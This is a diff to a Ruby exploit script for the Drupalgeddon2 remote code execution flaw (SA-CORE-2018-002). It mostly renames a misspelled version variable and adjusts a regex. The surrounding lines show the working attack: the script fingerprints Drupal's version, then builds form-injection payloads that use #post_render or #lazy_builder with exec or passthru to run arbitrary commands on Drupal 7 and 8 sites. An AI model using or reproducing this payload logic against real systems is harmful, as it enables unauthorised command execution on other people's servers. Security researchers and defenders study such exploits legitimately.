@@ -57,7 +57,7 @@ puts "-"*80
 
 
 # Try and get version
-drupalverion = nil
+drupalversion = nil
 # Possible URLs
 url = [
   target + "CHANGELOG.txt",
@@ -79,36 +79,36 @@ url.each do|uri|
     # Patched already?
     puts "[!] WARNING: Might be patched! Found SA-CORE-2018-002: #{url}" if response.body.include? "SA-CORE-2018-002"
 
-    drupalverion = response.body.match(/Drupal (.*),/).to_s().slice(/Drupal (.*),/, 1).strip
-    puts "[+] Drupal!: #{drupalverion}"
+    drupalversion = response.body.match(/Drupal (.*)[, ]/).to_s().slice(/Drupal (.*)[, ]/, 1).strip
+    puts "[+] Drupal!: #{drupalversion}"
     # Done!
     break
   elsif response.code == "403"
     puts "[+] Found  : #{uri} (#{response.code})"
 
-    drupalverion = uri.match(/core/)? '8.x' : '7.x'
-    puts "[+] Drupal?: #{drupalverion}"
+    drupalversion = uri.match(/core/)? '8.x' : '7.x'
+    puts "[+] Drupal?: #{drupalversion}"
   else
     puts "[!] MISSING: #{uri} (#{response.code})"
   end
 end
 
-if not drupalverion
+if not drupalversion
   puts "[!] Didn't detect Drupal version"
   puts "[!] Forcing Drupal v8.x attack"
-  drupalverion = "8.x"
+  drupalversion = "8.x"
 end
 puts "-"*80
 
 
 # PHP function to use (don't forget about disabled functions...)
-phpmethod = drupalverion.start_with?('8')? 'exec' : 'passthru'
+phpmethod = drupalversion.start_with?('8')? 'exec' : 'passthru'
 puts "[*] PHP cmd: #{phpmethod}"
 puts "-"*80
 
 
 ## Check the version to match the payload
-if drupalverion.start_with?('8')
+if drupalversion.start_with?('8')
   # Method #1 - Drupal 8,  timezone, #lazy_builder - response is 500 & blind (will need to disable target check for this to work!)
   #url = target + "user/register%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
   #payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=" + evil
@@ -117,7 +117,7 @@ if drupalverion.start_with?('8')
   url = target + "user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
   # Vulnerable Parameters: #access_callback / #lazy_builder / #pre_render / #post_render
   payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpmethod + "&mail[a][#type]=markup&mail[a][#markup]=" + evil
-elsif drupalverion.start_with?('7')
+elsif drupalversion.start_with?('7')
   # Method #3 - Drupal 7, name, #post_render - response is 200
   url = target + "?q=user/password&name[%23post_render][]=" + phpmethod + "&name[%23type]=markup&name[%23markup]=" + evil
   payload = "form_id=user_pass&_triggering_element_name=name"
@@ -139,7 +139,7 @@ end
 
 
 # Drupal v7 needs an extra value from a form
-if drupalverion.start_with?('7')
+if drupalversion.start_with?('7')
   req = Net::HTTP::Post.new(uri.request_uri)
   req.body = payload
   response = http.request(req)
@@ -161,7 +161,7 @@ response = http.request(req)
 if response.code == "200"
   puts "[+] Target seems to be exploitable! w00hooOO!"
   #puts "[+] Result: " + JSON.pretty_generate(JSON[response.body])
-  result = drupalverion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
+  result = drupalversion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
   puts "[+] Result: #{result}"
 else
   puts "[!] Target does NOT seem to be exploitable ~ Response: #{response.code}"
